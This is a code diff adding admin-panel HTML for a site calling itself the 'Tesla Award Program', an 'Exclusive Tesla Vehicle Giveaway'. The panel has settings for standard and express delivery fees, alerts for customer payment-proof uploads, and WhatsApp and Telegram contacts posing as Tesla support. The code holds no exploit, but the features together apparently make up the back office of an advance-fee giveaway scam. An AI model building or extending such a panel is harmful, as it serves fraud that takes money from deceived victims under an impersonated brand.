+                <label class="form-label" for="whatsappLabel">Button Label</label>
+                <input class="form-input" id="whatsappLabel" placeholder="Chat with us" onchange="saveSocialSettings()">
+              </div>
+            </div>
+
+            <div class="social-card">
+              <div class="social-icon-wrap telegram">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0088CC" stroke-width="2"><polygon points="9.17,16.17 13.41,19.64 23.38,1.05 2.22,9.82 9.17,16.17"/><line x1="9.17" y1="16.17" x2="13.76" y2="11.59"/></svg>
+              </div>
+              <div class="social-info">
+                <div class="title">Telegram</div>
+                <div class="desc">Telegram contact username shown on the website</div>
+              </div>
+              <div class="social-actions">
+                <label class="toggle-switch"><input type="checkbox" id="telegramEnabled" onchange="saveSocialSettings()"><span class="toggle-slider"></span></label>
+              </div>
+            </div>
+            <div style="display:flex;gap:12px;flex-wrap:wrap;">
+              <div style="flex:1;min-width:200px;">
+                <label class="form-label" for="telegramUsername">Telegram Username</label>
+                <input class="form-input" id="telegramUsername" placeholder="TeslaAwardBot" onchange="saveSocialSettings()">
+              </div>
+              <div style="flex:1;min-width:200px;">
+                <label class="form-label" for="telegramLabel">Button Label</label>
+                <input class="form-input" id="telegramLabel" placeholder="Chat with us" onchange="saveSocialSettings()">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB: DELIVERY FEES -->
+      <div class="tab-panel" id="panelDelivery">
+        <style>
+          .sg-header{display:flex;align-items:flex-start;gap:14px;margin-bottom:22px;padding-bottom:18px;border-bottom:1px solid var(--admin-border);}
+          .sg-icon{width:42px;height:42px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+          .sg-icon.red{background:rgba(227,25,55,.1);}
+          .sg-title{font-size:15px;font-weight:800;color:var(--dark);margin:0 0 3px;}
+          .sg-desc{font-size:12px;color:var(--admin-text-muted);margin:0;line-height:1.55;}
+          .fee-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px;}
+          @media(max-width:600px){.fee-grid{grid-template-columns:1fr;}}
+          .fee-card{border:1.5px solid var(--admin-border);border-radius:14px;padding:20px;background:var(--admin-bg);transition:border-color .2s;}
+          .fee-card:focus-within{border-color:var(--red);box-shadow:0 0 0 3px var(--admin-red-glow);}
+          .fee-card-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+          .fee-card-ico{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;}
+          .fee-card-ico.std{background:rgba(37,99,235,.1);}
+          .fee-card-ico.exp{background:rgba(227,25,55,.1);}
+          .fee-card-name{font-size:14px;font-weight:700;color:var(--dark);}
+          .fee-card-sub{font-size:11px;color:var(--admin-text-muted);margin-top:1px;}
+          .fee-field-label{font-size:10px;font-weight:700;color:var(--admin-text-secondary);text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px;display:block;}
+          .fee-input-row{display:flex;align-items:center;gap:0;border:1.5px solid var(--admin-border);border-radius:10px;overflow:hidden;background:white;transition:border-color .2s,box-shadow .2s;}
+          .fee-input-row:focus-within{border-color:var(--red);box-shadow:0 0 0 3px var(--admin-red-glow);}
+          .fee-symbol{padding:10px 10px 10px 14px;font-size:16px;font-weight:700;color:var(--admin-text-secondary);background:white;line-height:1;}
+          .fee-number{border:none;outline:none;padding:10px 14px 10px 4px;font-size:20px;font-weight:800;color:var(--dark);font-family:inherit;width:100%;background:white;}
+          .fee-number::-webkit-inner-spin-button,.fee-number::-webkit-outer-spin-button{opacity:0;}
+          .fee-actions{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-top:8px;}
+          .fee-status{font-size:12px;font-weight:600;}
+        </style>
+        <div class="settings-grid">
+          <div class="setting-group">
+            <div class="sg-header">
+              <div class="sg-icon red">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <rect x="1" y="3" width="15" height="13" rx="2"/>
+                  <path d="M16 8h4l3 5v3h-7V8z"/>
+                  <circle cx="5.5" cy="18.5" r="2.5"/>
+                  <circle cx="18.5" cy="18.5" r="2.5"/>
+                </svg>
+              </div>
+              <div>
+                <p class="sg-title">Delivery Fee Settings</p>
+                <p class="sg-desc">Set the display currency and the Standard / Express delivery fees. Changes are saved to the database and immediately reflected across the website.</p>
+              </div>
+            </div>
+
+            <div class="fee-currency" style="margin-bottom:18px;">
+              <label class="fee-field-label" for="currencySelect">Display Currency</label>
+              <select id="currencySelect" class="fee-select" style="width:100%;max-width:280px;padding:11px 12px;border-radius:10px;border:1px solid #e5e7eb;background:#fff;font-size:14px;color:#171a20;cursor:pointer;"></select>
+              <p style="margin:8px 0 0;font-size:12px;color:#6b7280;">This currency is used wherever delivery fees are shown.</p>
+            </div>
+
+            <div class="fee-grid">
+              <div class="fee-card">
+                <div class="fee-card-head">
+                  <div class="fee-card-ico std">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#2563EB" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M5 8h14M5 8a2 2 0 1 0-4 0v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8m-14 0V6a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v2"/>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="fee-card-name">Standard Delivery</div>
+                    <div class="fee-card-sub">7–12 business days · insured</div>
+                  </div>
+                </div>
+                <label class="fee-field-label" for="standardFeeInput">Standard Delivery Fee</label>
+                <div class="fee-input-row">
+                  <span class="fee-symbol">$</span>
+                  <input type="number" class="fee-number" id="standardFeeInput" placeholder="299" min="0" step="1" autocomplete="off">
+                </div>
+              </div>
+
+              <div class="fee-card">
+                <div class="fee-card-head">
+                  <div class="fee-card-ico exp">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#E31937" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                      <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="fee-card-name">Express Delivery</div>
+                    <div class="fee-card-sub">1–3 business days · priority</div>
+                  </div>
+                </div>
+                <label class="fee-field-label" for="expressFeeInput">Express Delivery Fee</label>
+                <div class="fee-input-row">
+                  <span class="fee-symbol">$</span>
+                  <input type="number" class="fee-number" id="expressFeeInput" placeholder="399" min="0" step="1" autocomplete="off">
+                </div>
+              </div>
+            </div>
+
+            <div class="fee-actions">
+              <button class="btn btn-primary" onclick="saveDeliveryFee()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/>
+                  <polyline points="17,21 17,13 7,13 7,21"/>
+                  <polyline points="7,3 7,8 15,8"/>
+                </svg>
+                Save Settings
+              </button>
+              <span class="fee-status" id="feeStatus"></span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- TAB: NOTIFICATIONS -->
+      <div class="tab-panel" id="panelNotifications">
+        <div class="ss-page">
+          <div class="ss-page-header">
+            <div>
+              <h3 class="ss-page-title">Notifications</h3>
+              <p class="ss-page-sub">Web push alerts for new orders and payment proofs — delivered even when the admin panel is closed.</p>
+            </div>
+          </div>
+
+          <div id="pushStatusBanner" class="push-banner push-banner--info" style="display:none"></div>
+
+          <div class="ss-grid">
+            <section class="ss-card">
+              <div class="ss-card-head">
+                <div class="ss-card-icon ss-card-icon--lock">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                </div>
+                <div>
+                  <h4 class="ss-card-title">Push subscription</h4>
+                  <p class="ss-card-desc">Subscribe this browser to receive system notifications.</p>
+                </div>
+              </div>
+              <div class="ss-card-body">
+                <div class="push-status-row">
+                  <div class="push-status-item">
+                    <span class="push-status-label">Permission</span>
+                    <span id="pushPermStatus" class="push-pill push-pill--muted">—</span>
+                  </div>
+                  <div class="push-status-item">
+                    <span class="push-status-label">Subscription</span>
+                    <span id="pushSubStatus" class="push-pill push-pill--muted">—</span>
+                  </div>
+                </div>
+                <div class="ss-actions" style="margin-top:16px;">
+                  <button type="button" class="ss-btn ss-btn-primary" id="pushEnableBtn" onclick="subscribePush()">Enable Notifications</button>
+                  <button type="button" class="ss-btn ss-btn-ghost" id="pushDisableBtn" style="display:none" onclick="unsubscribePush()">Unsubscribe</button>
+                  <button type="button" class="ss-btn ss-btn-ghost" id="pushTestBtn" onclick="testPushNotification()">Send test</button>
+                </div>
+                <p class="ss-field-hint" style="margin-top:12px;">Delivery depends on browser, OS, and device settings. Keep notifications allowed for this site for best reliability.</p>
+              </div>
+            </section>
+
+            <section class="ss-card">
+              <div class="ss-card-head">
+                <div class="ss-card-icon">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+                </div>
+                <div>
+                  <h4 class="ss-card-title">Notification settings</h4>
+                  <p class="ss-card-desc">Stored in the database. Applies to all subscribed admin devices.</p>
+                </div>
+              </div>
+              <div class="ss-card-body">
+                <div class="ss-toggle-row">
+                  <div>
+                    <div class="ss-toggle-title">Notifications master switch</div>
+                    <div class="ss-toggle-desc">Turn all push alerts on or off</div>
+                  </div>
+                  <label class="ss-switch">
+                    <input type="checkbox" id="pushMasterEnabled" onchange="savePushPrefs()" checked>
+                    <span class="ss-switch-ui"></span>
+                  </label>
+                </div>
+                <div class="ss-toggle-row">
+                  <div>
+                    <div class="ss-toggle-title">New order</div>
+                    <div class="ss-toggle-desc">Alert when a customer places an order</div>
+                  </div>
+                  <label class="ss-switch">
+                    <input type="checkbox" id="pushNewOrder" onchange="savePushPrefs()" checked>
+                    <span class="ss-switch-ui"></span>
+                  </label>
+                </div>
+                <div class="ss-toggle-row">
+                  <div>
+                    <div class="ss-toggle-title">Payment proof uploaded</div>
+                    <div class="ss-toggle-desc">Alert when a customer submits payment proof</div>
+                  </div>
+                  <label class="ss-switch">
+                    <input type="checkbox" id="pushPaymentProof" onchange="savePushPrefs()" checked>
+                    <span class="ss-switch-ui"></span>
+                  </label>
+                </div>
+              </div>
+            </section>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB: SETTINGS (Admin Password + WhatsApp) -->
+      <!-- TAB: SETTINGS -->
+      <div class="tab-panel" id="panelSettings">
+        <div class="ss-page">
+          <div class="ss-page-header">
+            <div>
+              <h3 class="ss-page-title">System Settings</h3>
+              <p class="ss-page-sub">Manage admin access and the public floating contact experience.</p>
+            </div>
+          </div>
+
+          <div class="ss-grid">
+            <!-- Admin Password -->
+            <section class="ss-card" id="ssPasswordCard">
+              <div class="ss-card-head">
+                <div class="ss-card-icon ss-card-icon--lock">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                </div>
+                <div>
+                  <h4 class="ss-card-title">Admin Password</h4>
+                  <p class="ss-card-desc">Update the password used to access this admin panel. Stored securely in the database.</p>
+                </div>
+              </div>
+              <div class="ss-card-body">
+                <div class="ss-field">
+                  <label class="ss-label" for="currentPwd">Current password</label>
+                  <input type="password" class="ss-input" id="currentPwd" autocomplete="current-password" placeholder="Enter current password">
+                </div>
+                <div class="ss-field-row">
+                  <div class="ss-field">
+                    <label class="ss-label" for="newPwd">New password</label>
+                    <input type="password" class="ss-input" id="newPwd" autocomplete="new-password" placeholder="Min. 8 characters">
+                  </div>
+                  <div class="ss-field">
+                    <label class="ss-label" for="confirmPwd">Confirm password</label>
+                    <input type="password" class="ss-input" id="confirmPwd" autocomplete="new-password" placeholder="Re-enter new password">
+                  </div>
+                </div>
+                <p class="ss-hint">Use at least 8 characters. You will need the new password on the next login.</p>
+                <div class="ss-actions">
+                  <button type="button" class="ss-btn ss-btn-primary" id="changePwdBtn" onclick="changePassword()">
+                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    Update password
+                  </button>
+                  <span class="ss-status" id="pwdStatus" aria-live="polite"></span>
+                </div>
+              </div>
+            </section>
+
+            <!-- Floating Contact -->
+            <section class="ss-card" id="ssContactCard">
+              <div class="ss-card-head">
+                <div class="ss-card-icon ss-card-icon--chat">
+                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                </div>
+                <div class="ss-card-head-main">
+                  <h4 class="ss-card-title">Floating Contact Button</h4>
+                  <p class="ss-card-desc">Show a contact launcher on the public website. Visitors can open WhatsApp and/or Telegram from a clean popup.</p>
+                </div>
+                <label class="ss-switch" title="Enable floating contact">
+                  <input type="checkbox" id="fcEnabled" onchange="saveFloatingContact()">
+                  <span class="ss-switch-ui"></span>
+                </label>
+              </div>
+              <div class="ss-card-body">
+                <div class="ss-channel">
+                  <div class="ss-channel-head">
+                    <div class="ss-channel-brand ss-channel-brand--wa">
+                      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.435 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+                    </div>
+                    <div>
+                      <div class="ss-channel-title">WhatsApp</div>
+                      <div class="ss-channel-sub">Opens a chat with your configured number</div>
+                    </div>
+                  </div>
+                  <div class="ss-field-row">
+                    <div class="ss-field">
+                      <label class="ss-label" for="fcWaPhone">Phone number <span class="ss-optional">(optional)</span></label>
+                      <input type="text" class="ss-input" id="fcWaPhone" placeholder="e.g. +15550100" autocomplete="tel">
+                      <p class="ss-field-hint">International format with country code. Example: <code>+15550100</code> or <code>+2348012345678</code>. Digits only after the optional leading +. Leave empty to hide WhatsApp.</p>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="ss-channel">
+                  <div class="ss-channel-head">
+                    <div class="ss-channel-brand ss-channel-brand--tg">
+                      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
+                    </div>
+                    <div>
+                      <div class="ss-channel-title">Telegram</div>
+                      <div class="ss-channel-sub">Opens a chat with your Telegram username</div>
+                    </div>
+                  </div>
+                  <div class="ss-field-row">
+                    <div class="ss-field">
+                      <label class="ss-label" for="fcTgUser">Username <span class="ss-optional">(optional)</span></label>
+                      <input type="text" class="ss-input" id="fcTgUser" placeholder="e.g. TeslaSupport" autocomplete="off">
+                      <p class="ss-field-hint">Telegram username without @. Example: <code>TeslaSupport</code> opens <code>t.me/TeslaSupport</code>. Leave empty to hide Telegram.</p>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="ss-actions">
+                  <button type="button" class="ss-btn ss-btn-primary" id="fcSaveBtn" onclick="saveFloatingContact()">
+                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17,21 17,13 7,13 7,21"/><polyline points="7,3 7,8 15,8"/></svg>
+                    Save contact settings
+                  </button>
+                  <span class="ss-status" id="fcStatus" aria-live="polite"></span>
+                </div>
+              </div>
+            </section>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- TAB: WEBSITE SETTINGS -->
+      <div class="tab-panel" id="panelWebsite">
+        <div class="admin-card">
+          <div class="card-header">
+            <h3><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg> Website Settings</h3>
+          </div>
+          <div style="padding:8px 24px 24px;">
+            <div class="ws-grid">
+              <div class="ws-section">
+                <div class="sg-header"><div class="sg-icon blue"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></div><div><p class="sg-title">General</p><p class="sg-desc">Basic branding and contact information</p></div></div>
+                <label class="ws-label">Site Title</label><input type="text" class="ws-input" value="Tesla Award Program">
+                <label class="ws-label" style="margin-top:12px;">Tagline</label><input type="text" class="ws-input" value="Exclusive Tesla Vehicle Giveaway">
+                <label class="ws-label" style="margin-top:12px;">Contact Email</label><input type="email" class="ws-input" placeholder="admin@example.com">
+              </div>
+              <div class="ws-section">
+                <div class="sg-header"><div class="sg-icon gray"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#6B7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><div><p class="sg-title">Visibility &amp; Access</p><p class="sg-desc">Control site availability and features</p></div></div>
+                <div class="ws-toggle-row"><div><div class="notif-row-title">Maintenance Mode</div><div class="notif-row-desc">Show a maintenance page to visitors</div></div><label class="notif-toggle"><input type="checkbox" onchange="showToast('Setting updated')"><span class="notif-slider"></span></label></div>
+                <div class="ws-toggle-row"><div><div class="notif-row-title">Allow New Registrations</div><div class="notif-row-desc">Enable or disable new user sign-ups</div></div><label class="notif-toggle"><input type="checkbox" checked onchange="showToast('Setting updated')"><span class="notif-slider"></span></label></div>
+                <div class="ws-toggle-row" style="border:none;"><div><div class="notif-row-title">Show Testimonials Video</div><div class="notif-row-desc">Display the testimonials video section</div></div><label class="notif-toggle"><input type="checkbox" checked onchange="showToast('Setting updated')"><span class="notif-slider"></span></label></div>
+              </div>
+            </div>
+            <div style="margin-top:20px;display:flex;justify-content:flex-end;"><button class="btn btn-primary" onclick="showToast('Website settings saved')"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17,21 17,13 7,13 7,21"/><polyline points="7,3 7,8 15,8"/></svg> Save Settings</button></div>
+          </div>
+        </div>
+      </div>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<script src="js/config.js?v=20260819k"></script>
+<script src="js/payment-methods.js?v=20260819k"></script>
+<script src="js/app.js?v=20260819k"></script><script src="admin/js/admin-core.js?v=20260819k"></script>
+<script src="admin/js/admin-helpers.js?v=20260819k"></script>
+<script src="admin/js/admin-auth.js?v=20260819k"></script>
+<script src="admin/js/admin-nav.js?v=20260819k"></script>
+<script src="admin/js/admin-data.js?v=20260819k"></script>
+<script src="admin/js/admin-dashboard.js?v=20260819k"></script>
+<script src="admin/js/admin-users.js?v=20260819k"></script>
+<script src="admin/js/admin-chart.js?v=20260819k"></script>
+<script src="admin/js/admin-vehicles.js?v=20260819k"></script>
+<script src="admin/js/admin-payments.js?v=20260819k"></script>
+<script src="admin/js/admin-cc-config.js?v=20260819k"></script>
+<script src="admin/js/admin-proofs.js?v=20260819k"></script>
+<script src="admin/js/admin-social.js?v=20260819k"></script>
+<script src="admin/js/admin-settings.js?v=20260820a"></script>
+<script src="admin/js/admin-notifications.js?v=20260820b"></script>
+<script src="admin/js/admin-orders.js?v=20260819k"></script>
+<script src="admin/js/admin-init.js?v=20260819k"></script>
+
+<!-- Push prompts: non-blocking top banners -->
+<div id="pushEnableModal" class="push-topbar" style="display:none" role="status">
+  <div class="push-topbar-inner">
+    <div class="push-topbar-icon" aria-hidden="true">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+    </div>
+    <div class="push-topbar-text">
+      <strong>Enable Notifications</strong>
+      <span>Get alerts when a user places an order or uploads payment proof — even if the admin panel is closed.</span>
+    </div>
+    <div class="push-topbar-actions">
+      <button type="button" class="push-topbar-btn push-topbar-btn--primary" onclick="subscribePush()">Enable</button>
+      <button type="button" class="push-topbar-btn" onclick="dismissPushPrompt()">Not now</button>
+    </div>
+  </div>
+</div>
+<div id="pushReenableModal" class="push-topbar push-topbar--warn" style="display:none" role="status">
+  <div class="push-topbar-inner">
+    <div class="push-topbar-icon push-topbar-icon--warn" aria-hidden="true">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+    </div>
+    <div class="push-topbar-text">
+      <strong>Notifications need attention</strong>
+      <span>Your subscription is no longer active. Re-enable to keep receiving order and payment-proof alerts.</span>
+    </div>
+    <div class="push-topbar-actions">
+      <button type="button" class="push-topbar-btn push-topbar-btn--primary" onclick="subscribePush()">Re-enable</button>
+      <button type="button" class="push-topbar-btn" onclick="hidePushModals()">Dismiss</button>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
